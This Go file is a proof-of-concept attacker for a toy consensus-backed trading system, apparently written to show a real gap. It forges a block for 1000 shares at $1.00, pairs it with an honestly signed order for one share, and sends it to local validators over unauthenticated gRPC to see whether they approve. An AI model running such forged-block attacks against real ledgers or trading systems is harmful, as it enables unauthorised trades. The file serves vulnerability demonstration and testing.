// malicious_proposer — a stand-in for a compromised leader, used to demonstrate
// a real gap in the consensus layer.
//
// It is NOT part of the running system. Like oracle_service/rogue_oracle.py it
// only does something when a human launches it. It talks gRPC directly to the
// UNMODIFIED validators on their (unauthenticated) ports and asks them to vote
// on a block whose committed contents — 1000 shares at $1.00 — do not match the
// honestly-signed order it presents alongside (1 share at market).
//
// The validators verify the signature against the honest envelope, never check
// that the block matches it, and approve. That is the vulnerability.
//
//	Run from the nodes/ directory, with the Oracle and validators up:
//	  go run ./attacker
package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"os"
	"strings"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"

	"nodes/clusterauth"
	pbc "nodes/consensus"
	pbo "nodes/oracle"
)

const (
	oracleAddr = "127.0.0.1:8001"
	ticker     = "AAPL"
)

var validators = []string{"localhost:9002", "localhost:9003"}

// block mirrors nodes/blockchain.go's Block (same fields, order and JSON tags)
// so computeHash below produces exactly the hash a validator expects.
type block struct {
	Index     int    `json:"index"`
	PrevHash  string `json:"prev_hash"`
	Timestamp int64  `json:"timestamp"`
	OrderID   int    `json:"order_id"`
	Stock     string `json:"stock"`
	OrderType string `json:"order_type"`
	Quantity  string `json:"quantity"`
	Price     string `json:"price"`
	NodeName  string `json:"node_name"`
	Signature string `json:"signature"`
	PublicKey string `json:"public_key"`
	Hash      string `json:"hash"`
}

// computeHash reproduces nodes/blockchain.go exactly. The forged block must hash
// correctly or the validator's chain-continuity check (check 1) would reject it —
// and we want every real check to pass, so only the missing check is exposed.
func computeHash(b block) string {
	b.Hash = ""
	raw, _ := json.Marshal(b)
	h := sha256.Sum256(raw)
	return hex.EncodeToString(h[:])
}

// readValidatorHead reads a validator's on-disk chain so the forged block can be
// chained onto its current head. A real attacker would learn this just as easily.
func readValidatorHead(path string) (int, string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Printf("  cannot read %s: %v\n", path, err)
		os.Exit(1)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	var head struct {
		Index int    `json:"index"`
		Hash  string `json:"hash"`
	}
	json.Unmarshal([]byte(lines[len(lines)-1]), &head)
	return head.Index, head.Hash
}

func fetchHonestPrice() string {
	conn, err := grpc.NewClient(oracleAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		fmt.Printf("  oracle dial failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	resp, err := pbo.NewOracleServiceClient(conn).GetPrice(ctx, &pbo.PriceRequest{Ticker: ticker})
	if err != nil {
		fmt.Printf("  oracle rpc failed: %v\n", err)
		os.Exit(1)
	}
	return resp.ExecutionPrice
}

func main() {
	line := strings.Repeat("─", 64)
	cred := "NONE (outsider with no cluster credential)"
	if os.Getenv("CLUSTER_SECRET") != "" {
		cred = "PRESENTED (simulating a compromised node that holds the secret)"
	}
	fmt.Printf("\n%s\n  MALICIOUS PROPOSER — impersonating the leader on the network\n%s\n", line, line)
	fmt.Printf("  Cluster credential: %s\n\n", cred)

	// 1. A genuinely valid signature over an HONEST order: BUY 1 AAPL.
	//    This is what the user actually authorised and signed.
	priv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pubDER, _ := x509.MarshalPKIXPublicKey(&priv.PublicKey)
	pubPEM := string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubDER}))

	nonce := fmt.Sprintf("attack-%d", time.Now().UnixNano())
	honestMsg := fmt.Sprintf(`{"nonce":"%s","order_type":"BUY","quantity":"1","stock":"AAPL"}`, nonce)
	digest := sha256.Sum256([]byte(honestMsg))
	sigDER, _ := ecdsa.SignASN1(rand.Reader, priv, digest[:])
	sig := base64.StdEncoding.EncodeToString(sigDER)

	fmt.Printf("  Signed order (what the user authorised):\n    %s\n", honestMsg)

	// 2. The honest, current price — so the divergence check (check 4) passes.
	honestPrice := fetchHonestPrice()
	fmt.Printf("  Honest oracle price presented in the envelope: $%s\n\n", honestPrice)

	// 3. The FORGED block — 1000 shares at $1.00 — chained onto the validator's
	//    head and re-hashed so chain validation still succeeds.
	headIdx, headHash := readValidatorHead("chain_node2.jsonl")
	ts := time.Now().Unix()
	fIndex := headIdx + 1
	fQty, fPrice := "1000", "1.00"
	if os.Getenv("HONEST_PRICE") == "1" {
		fPrice = honestPrice // forge only the quantity; price matches the oracle
	}
	fHash := computeHash(block{
		Index: fIndex, PrevHash: headHash, Timestamp: ts, OrderID: 9999,
		Stock: ticker, OrderType: "BUY", Quantity: fQty, Price: fPrice,
		NodeName: "node1", Signature: sig, PublicKey: pubPEM,
	})

	fmt.Printf("  Forged block (what would actually be committed):\n")
	fmt.Printf("    block #%d | BUY %s %s @ $%s\n\n", fIndex, fQty, ticker, fPrice)
	fmt.Printf("  Mismatch the validators are supposed to catch:\n")
	fmt.Printf("    signed for   1  share  @ market ($%s)\n", honestPrice)
	fmt.Printf("    committing  %s shares @ $%s\n\n%s\n\n", fQty, fPrice, line)

	forged := &pbc.Block{
		Index: int32(fIndex), PrevHash: headHash, Timestamp: ts,
		OrderId: 9999, Stock: ticker, OrderType: "BUY",
		Quantity: fQty, Price: fPrice, NodeName: "node1",
		Signature: sig, PublicKey: pubPEM, Hash: fHash,
	}

	approvals := 0
	for _, addr := range validators {
		conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(insecure.NewCredentials()))
		if err != nil {
			fmt.Printf("  %s — dial failed: %v\n", addr, err)
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		if secret := os.Getenv("CLUSTER_SECRET"); secret != "" {
			ctx = metadata.AppendToOutgoingContext(ctx, clusterauth.MetadataKey,
				clusterauth.Token(secret, pbc.ConsensusService_Propose_FullMethodName, time.Now()))
		}
		resp, err := pbc.NewConsensusServiceClient(conn).Propose(ctx, &pbc.ProposeRequest{
			Block:           forged,
			OraclePrice:     honestPrice,
			OracleTimestamp: time.Now().UTC().Format(time.RFC3339Nano),
			Signature:       sig,
			PublicKey:       pubPEM,
			SignedMessage:   honestMsg,
		})
		cancel()
		conn.Close()
		if err != nil {
			fmt.Printf("  %s — rpc error: %v\n", addr, err)
			continue
		}
		if resp.Approve {
			approvals++
			fmt.Printf("  %s  ▶  APPROVE   (verified the signature, never checked the block)\n", resp.NodeId)
		} else {
			fmt.Printf("  %s  ▶  REJECT    %s\n", resp.NodeId, resp.Reason)
		}
	}

	fmt.Printf("\n%s\n", line)
	if approvals == len(validators) {
		fmt.Printf("  RESULT: %d/%d honest validators approved a FORGED block.\n", approvals, len(validators))
		fmt.Printf("  With the leader's self-vote that is full consensus on a trade\n  the user never authorised. VULNERABILITY CONFIRMED.\n")
	} else {
		fmt.Printf("  RESULT: %d/%d approved — the forged block was rejected.\n", approvals, len(validators))
		fmt.Printf("  The validators now cross-check the block. DEFENCE HOLDS.\n")
	}
	fmt.Printf("%s\n\n", line)
}
